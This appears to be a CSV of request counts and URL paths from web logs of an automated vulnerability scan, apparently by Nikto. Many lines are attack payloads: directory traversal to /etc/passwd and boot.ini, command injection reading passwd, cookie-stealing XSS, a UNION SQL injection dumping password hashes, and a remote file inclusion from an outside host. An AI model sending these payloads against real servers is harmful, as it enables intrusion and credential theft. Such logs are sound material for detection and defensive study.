1,/cgi-bin/bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/ows/restricted.show
1,mt-static/mt-check.cgi
1,/TvLBvkHh.tcl
1,/cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00
5,/phpmyadmin/_scripts/setup.php
1,htsearch?-c/nonexistant
1,/shopping400.mdb
1,Count.cgi
1,"tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/cgi-bin/architext_query.pl
1,/_cti_pvt/
1,/cgi-bin/html2wml.cgi
1,/cfdocs/cfcache.map
4,/index.action
1,/cgi-bin/admin/admin.cgi
1,/TvLBvkHh.php=
1,/admin-serv/config/admpw
1,/TvLBvkHh.php3
1,/simplebbs/users/users.php
1,infosrch.cgi
1,/TvLBvkHh.php4
1,/cgi-bin/.cobalt
1,/TvLBvkHh.php+
1,/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
1,cgiwrap/%3Cfont%20color=red%3E
1,/TvLBvkHh.axd
1,/cgi-bin/mkilog.exe
1,/TvLBvkHh.render_warning_screen
4,/wls-wsat/CoordinatorPortType
3,/muieblackcat
1,/com
1,/cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/cgi-bin/erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/vgn/vr/Select
1,/cgi-bin/sscd_suncourier.pl
1,/index.php?page=../../../../../../../../../../boot.ini
1,/cgi-bin/DCShop/auth_data/auth_user_file.txt
1,/jgb_eng_php3/cfooter.php3
1,simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/TvLBvkHh.passwd
1,/index.do
1,/lpt9
1,pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,ezman.cgi
1,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;
1,/cgi-bin/horde/test.php?mode=phpinfo
1,/tftpphone/
1,/anthill/login.php
1,/cgi-bin/dcshop/auth_data/auth_user_file.txt
1,guestbook.pl
1,/cgi-bin/lwgate
1,/config.php
1,/cgi-bin/calendar.pl
1,/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/mt/mt.cfg
1,/TvLBvkHh.jsp+
1,/home.php?arsc_language=elvish
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc
1,"/emailfriend/emailnews.php?id=\""<script>alert(document.cookie)</script>"
1,/cutenews/index.php?debug
1,/server/
1,/htbin/
1,/catalog.nsf
1,/TvLBvkHh.conf
1,/officescan/cgi/cgiChkMasterPwd.exe
1,/SiteServer/Admin/commerce/foundation/DSN.asp
1,/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd
1,/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.INC
1,/search.asp?term=<%00script>alert('Vulnerable')</script>
1,/cgi-bin/boozt/admin/index.cgi?section=5&input=1
1,/nsn/..%5Cwebdemo/env.bas
1,/cgi-bin/ImageFolio/admin/admin.cgi
1,/webcart/carts/
1,hello.bat?&dir+c:\\
1,moin.cgi?test
1,/TvLBvkHh.pt
1,/sips/sipssys/users/a/admin/user
1,loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/blah_badfile.shtml
1,/phpmyadmin2/index.php
1,/mail.box
1,/index.aspx%5C
1,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
1,/admin/browse.asp?FilePath=c:\&Opt=2&level=0
2,/cgi-bin/cgiwrap/~web
5,/PhpMyAdmin/scripts/setup.php
1,input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.php/%5C%22%3E%3Cscript%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C
1,/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/TvLBvkHh.dk
1,/TvLBvkHh.pwd
1,/cgi-bin/banner.cgi
1,redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E
1,/TvLBvkHh.it
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd
1,/tiki/tiki-install.php
1,/nsn/..%5Cutil/set.bas
1,/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
1,/TvLBvkHh.password
1,/TvLBvkHh.ca
1,/Config1.htm
1,whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,"/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,nph-error.pl
2,/cgi-bin/cgiwrap/~smtp
1,pals-cgi?palsAction=restart&documentName=/etc/passwd
1,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
1,perl?-v
1,/gb/index.php?login=true
1,/cgi-bin/ss
1,/TvLBvkHh.cs
1,/TvLBvkHh.utf8
1,/s9sCh.csp
1,/cgi.cgi/
1,formmail.cgi
1,/cgi/
1,/phpmyadmin/config.php
1,/forums/config.php
1,/instantwebmail/message.php
1,/app/provision/
1,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>"
1,/addressbook/index.php?name=<script>alert('Vulnerable')</script>
1,redirect
2,/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
1,/cgi-bin/spin_client.cgi?aaaaaaaa
1,/TvLBvkHh.js
1,/cgi-bin/betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/Xcelerate/LoginPage.html
1,/node/view/666%5C%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
1,/TvLBvkHh.thtml
2,cgiwrap/~noaccess
1,/cgi-bin/aglimpse.cgi
1,/cgi-bin/dbman/db.cgi?db=no-db
1,/shopa_sessionlist.asp
1,/WEB-INF./web.xml
1,/nsn/..%5Cweb/fdir.bas
1,ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/TvLBvkHh.fr
1,test-cgi.tcl
1,compatible.cgi
1,/cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/scripts/samples/search/filetime.idq
1,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~smmsp
1,/TvLBvkHh.btr
1,/TvLBvkHh.old
1,/exchange/lib/PUBFLD.INC
1,classified.cgi
1,/phpEventCalendar/file_upload.php
1,/cgi-bin/calendar
1,/index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.cp866
2,cgiwrap/~guest
2,//MyAdmin/scripts/setup.php
1,com5..........................................................................................................................................................................................................................box
1,/cgi-bin/stats/statsbrowse.asp?filepath=c:\&Opt=3
1,/phpMyadmin_bak/index.php
1,/../../../../../../../etc/passwd
1,/cbms/usersetup.php
1,/smg_Smxcfg30.exe?vcc=3560121183d3
1,/xml/
1,/TvLBvkHh.html
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink
1,/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp
1,/cgi-bin/archie
1,/cgi-bin/test-cgi?/*
1,/webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSPStoreType=image/gif
1,erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/badmin.cgi
1,/vgn/ac/data
1,/cgi-bin/awstats.pl
1,/upload.asp
1,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
2,/login.asp
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.mdb+
1,/viewpage.php?file=/etc/passwd
1,input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,webmap.cgi
1,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>"
1,/phpping/index.php?pingto=www.test.com%20|%20dir%20c:\\
1,/digium/
1,/phptonuke.php?filnavn=/etc/passwd
2,/login.aspx
2,/cgi-bin/pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/cgi-bin/ws_ftp.ini
1,data/fetch.php?page=
1,/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~operator
1,common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/spip/
1,/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
2,/cgi-bin/cart.pl?db='
2,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
1,/cgi-bin/webplus.exe?about
1,/TvLBvkHh.cgi
1,/SQLQHit.asp
1,gm.cgi
1,/script%3Ealert('Vulnerable')%3C/script%3E.cfm
1,/grandstream/
1,/PLCM/
1,/cgi-bin/way-board.cgi?db=/etc/passwd%00
1,/cgi-bin-sdb/printenv
1,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtml
2,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
1,/exchange/lib/GETWHEN.INC
1,/search?NS-query-pat=../../../../../../../../../../etc/passwd
1,/scripts/samples/search/filesize.idq
1,/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/default.asp
1,/USER/CONFIG.AP
1,LWGate.cgi
1,/TvLBvkHh.xsql
2,cart.pl?db='
1,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
1,/vgn/stylepreviewer
1,empower?DB=whateverwhatever
2,atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
3,///
1,/default.htm
1,/cgi-win/
2,cgiwrap/~smmsp
1,anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,Pbcgi.exe
1,/TvLBvkHh.apw
1,//../../../../../../../../../../boot.ini
1,/TvLBvkHh.notes
1,cachemgr.cgi
1,/cfdocs/snippets/evaluate.cfm
1,/SiteServer/admin/
1,/Admin_files/order.log
1,/vgn/record/previewer
1,newsdesk.cgi?t=../../../../../../../../../../etc/passwd
13,/manager/html
1,/gxp280/
1,/fcgi-bin/
1,campas?%0acat%0a/etc/passwd%0a
1,/cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cbms/editclient.php
1,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
1,/cgi-bin/nph-error.pl
1,cgiemail-1.4/cgicso?query=AAA
1,/TvLBvkHh.SSIFilter
1,boozt/admin/index.cgi?section=5&input=1
1,/tftpserver/
1,/doc/webmin.config.notes
1,/cgi-bin/moin.cgi?test
1,/blah123.php
1,/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/web.config
2,cgiwrap/~unknown
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.types
1,/cgi-bin/echo.bat
1,/cgi-bin/search
1,/guestbook/admin/o12guest.mdb
1,/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/ibill.pm
1,emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
1,"/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script>"
1,/%25a%25s%25p%25d
1,/getaccess
3,/%5C/
1,query?mss=%2e%2e/config
1,/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp
1,/TvLBvkHh.phtml
1,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/nsn/..%5Cutil/userlist.bas
1,/hola/admin/cms/htmltags.php?datei=./sec/data.php
1,/TvLBvkHh.snp
1,/TvLBvkHh.php3+
1,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>"
1,WS_FTP.ini
1,/eng/start/StatPtrGen.htm
1,/vgn/ac/esave
1,YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,testcgi.exe
1,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.config~
1,/nsn/..%5Cutil/type.bas
1,/cgi-bin/foxweb.dll
1,/guestbook/admin.php
1,/provisioning/
1,/blah-whatever-badfile.jsp
1,/tiki/
1,/TvLBvkHh.chl+
1,/TvLBvkHh.iso2022-kr
1,/typo3conf/localconf.php
1,viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/orders/orders.txt
1,post-query
1,/ticket.php?id=99999
1,/TvLBvkHh.wwwacl
1,/lists/admin/
1,/search/htx/SQLQHit.asp
1,shtml.dll
1,/TvLBvkHh.stat
1,/a.jsp/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/WebAdmin.dll?View=Logon
1,/TvLBvkHh.dat
1,/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
1,query
1,/inc/dbase.php
1,/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
1,/cgi-bin/orders/orders.txt
1,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]"
1,/../../../../../../../../../../etc/passwd
1,/cgi-bin/guestbook/passwd
1,/cfdocs/expeval/openfile.cfm
1,ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/TvLBvkHh.SMAIL893
1,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
1,/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp
1,/cfdocs/cfmlsyntaxcheck.cfm
1,/cgi-bin/awstats/awstats.pl
1,/.../.../.../.../.../.../.../.../.../boot.ini
1,/rtm.log
1,/weblogic
1,/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/bb000001.pl%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/database/db2000.mdb
1,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>"
5,/./
1,"FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
1,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>"
1,post32.exe%7Cdir%20c:%5C%5C
1,/junk.aspx
1,sscd_suncourier.pl
1,/TvLBvkHh.sql
1,mt/mt-check.cgi
1,/SiteServer/Admin/knowledge/dsmgr/default.asp
1,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.jsp
2,/phpma/index.php
1,story.pl?next=../../../../../../../../../../etc/passwd%00
1,myguestbook.cgi?action=view
1,/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00
1,/nsn/..%5Cutil/glist.bas
2,pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/TvLBvkHh.xls
2,/admin/phpmyadmin/index.php
1,/horde/test.php?mode=phpinfo
2,/typo3/phpmyadmin/index.php
1,/upd/
1,/cgi-bin/mrtg.cgi?cfg=blah
1,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,photo/protected/manage.cgi
1,"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>"
1,aglimpse.cgi
1,/examples/jsp/source.jsp??
1,FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/SiteServer/Admin/commerce/foundation/driver.asp
1,mailit.pl
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.stm
1,dcshop/auth_data/auth_user_file.txt
1,/cgi-shl/win-c-sample.exe
3,/ccvv
1,/cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,webgais
1,horde/test.php?mode=phpinfo
2,/cgi-bin/formmail.pl
1,/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>
2,/article.cfm?id=1'<script>alert(document.cookie);</script>
1,/junk988.aspx%5C
1,mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,plusmail
1,/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
2,/cgi-bin/wrap
1,perl.exe
1,webplus?script=../../../../../../../../../../etc/passwd
1,/a?<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/auth_data/auth_user_file.txt
1,/WEB-INF/web.xml
1,/phpimageview.php?pic=javascript:alert(8754)
1,download.cgi
1,/TvLBvkHh.koi8-r
1,probecontrol.cgi?command=enable&username=cancer&password=killer
2,/cgi-bin/pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/ssdefs/
1,auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.el
1,cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,"/cgi-bin/alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/scripts/httpodbc.dll
2,/cgi-bin/wwwwais
1,/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
1,/cgi-perl/
1,/TvLBvkHh.show
1,/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
1,/cgi-bin/diagnose.cgi
1,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.java
1,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
1,/cgi-bin/classifieds/index.cgi
2,/cgi-bin/cgiwrap/~sys
1,/cgi-bin/Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
4,/index.php
1,/cgi-bin/gH.cgi
1,/cgi-bin/opendir.php?/etc/passwd
1,/SiteServer/admin/findvserver.asp
1,"/forumdisplay.php?GLOBALS[]=1&f=2&comma=\"".system('id').\"""
1,calendar_admin.pl?config=|cat%20/etc/passwd|
1,fpsrvadm.exe
1,/PMA/index.php
1,nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/fpsrvadm.exe
1,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/polycomftp/
1,/cgi-bin/retrieve_password.pl
1,handler.cgi
2,cgiwrap/~nuucp
1,perl
1,snorkerz.bat
1,nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/cgi-bin/bigconf.cgi
1,/sipphones/
1,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
2,/MyAdmin/scripts/setup.php
1,admin/admin.cgi
1,/cfdocs/examples/parks/detail.cfm
1,/geeklog/users.php
1,/cgi-bin/flexform
1,dumpenv.pl
1,mkplog.exe
2,/cgi-bin/cgiwrap/~unknown
1,snorkerz.cmd
1,YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,test-cgi.exe?<script>alert(document.cookie)</script>
2,cgiwrap/~nobody
1,"/ca000001.pl?ACTION=SHOWCART&hop=\""><script>alert('Vulnerable')</script>&PATH=acatalog%2f"
2,/_mem_bin/auoconfig.asp
1,/cgi-home/
1,/phpMyAdmin/index.php
1,/cgi-bin/mt/mt-check.cgi
1,/TvLBvkHh.CGI
1,cgiwrap/~ZA3Z1
1,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/exchange/lib/PAGEUTIL.INC
1,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.shtm
1,guestbook.cgi
1,ibill.pm
1,cmd.exe?/c+dir
1,/TvLBvkHh.cellsprint
1,/cgi-bin/dumpenv.pl
1,/cgi-bin/htsearch?exclude=%60/etc/passwd%60
2,/index
1,/TvLBvkHh.net
1,/exchange/lib/DELETE.INC
1,/TvLBvkHh.back
1,/file-that-is-not-real-2002.php3
2,cgiwrap/~test
1,/examples/cookie
1,/cgi-bin/testing_whatever
1,"/soinfo.php?\""><script>alert('Vulnerable')</script>"
1,/scripts/repost.asp
1,/cgi-bin/hello.bat?&dir+c:\\
1,SGB_DIR/superguestconfig
1,/exchange/lib/SESSION.INC
1,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
1,/mitel/
5,/hp/device/this.LCDispatcher
1,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
1,/aMiWjJNIot
1,/TvLBvkHh.mdb
1,/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/iissamples/issamples/SQLQHit.asp
2,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
1,/index.php/123
1,/cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/ews/ews/architext_query.pl
1,/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0
1,/tftpboot/backup/
1,/TvLBvkHh.ASP
1,scoadminreg.cgi
1,smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview
1,/index.jsp%00x
1,/pma-old/index.php
1,/cgi-bin/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/webcgi/
1,/?mod=some_thing&op=browse
1,/iissamples/issamples/sqlqhit.asp
1,/cgi-bin/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
2,cgiwrap/~operator
1,/cgi-bin/testcgi.exe
1,/SiteServer/Admin/knowledge/persmbr/vs.asp
1,/SPA942/
1,/readme.eml
1,/?mod=<script>alert(document.cookie)</script>&op=browse
1,/vgn/jsp/previewer
1,/cgi-bin/search.php?searchstring=<script>alert(document.cookie)</script>
1,/TvLBvkHh.bat%7Cdir
1,/tsweb/
1,/cgi-bin/cmd.exe?/c+dir
1,date
1,technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,/cgi-bin/photo/protected/manage.cgi
1,/cgi-bin/fortune
1,/exchange/lib/JSUTIL.INC
2,/cgi-bin/cgiwrap/~sshd
2,/tools/phpMyAdmin/index.php
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,blog/mt-load.cgi
1,/cgi-bin/uptime
1,/forums/modules/vwar/admin/config.php
1,/TvLBvkHh.LOG
1,/cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
1,dcshop/orders/orders.txt
1,/local/httpd$map.conf
2,/cgi-bin/cgiwrap/~www
1,retrieve_password.pl
1,/webcart-lite/orders/import.txt
1,/vider.php3
1,flexform
1,/xps/
1,/?Open
1,/TvLBvkHh.genpopuplist
1,echo.bat
1,/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/pmamy/index.php
1,/examples/session
1,///etc/hosts
1,/cgi-bin/compatible.cgi
1,/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
1,/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
8,/phpMyAdmin/scripts/setup.php
1,ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/title.cgi
1,/%3C/title%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,mail
1,/TvLBvkHh.sys
1,foxweb.dll
1,/index.asp%5C
2,/cgi-bin/horde/test.php
1,fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/TvLBvkHh.AP
1,/cgi-bin/perl.exe?-v
1,/nsn/..%5Cutil/attrib.bas
1,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
1,/cgi-bin/query?mss=%2e%2e/config
1,/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/goform/CheckLogin?login=root&password=tslinux
1,lwgate.cgi
1,/cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.shtml
1,/error/HTTP_NOT_FOUND.html.var
1,/TvLBvkHh.backup
1,"/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,"/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/?OpenServer
1,/MIDICART/midicart.mdb
1,/phonecfg.cfg
1,/?sql_debug=1
2,wwwwais
1,/scripts/cpshost.dll
1,/TvLBvkHh.pl%7Cdir
1,/TvLBvkHh.10:100
3,//pma/scripts/setup.php
1,/TvLBvkHh.signature
1,/Mem/dynaform/FileExplorer.htm
1,/pmamy2/index.php
1,/nsn/..%5Cutil/rd.bas
1,mrtg.cgi?cfg=blah
1,test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/cfdocs/examples/cvbeans/beaninfo.cfm
1,/cgi-bin/test-cgi.exe?<script>alert(document.cookie)</script>
1,/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
1,/vchat/msg.txt
1,/cfcache.map
1,wrap
2,cgiwrap/~web
1,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,com5.pl
1,/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\boot.ini
1,/guestbook/pwd
1,/TvLBvkHh.ml
1,/bigconf.cgi
1,/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
1,/index.pl
1,cgitest.exe
1,"/upload.php?type=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/wwwadmin.pl
1,/webcart-lite/config/import.txt
1,/cgi-bin/test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/cgi-bin/classified.cgi
1,/cgi-bin/common/listrec.pl
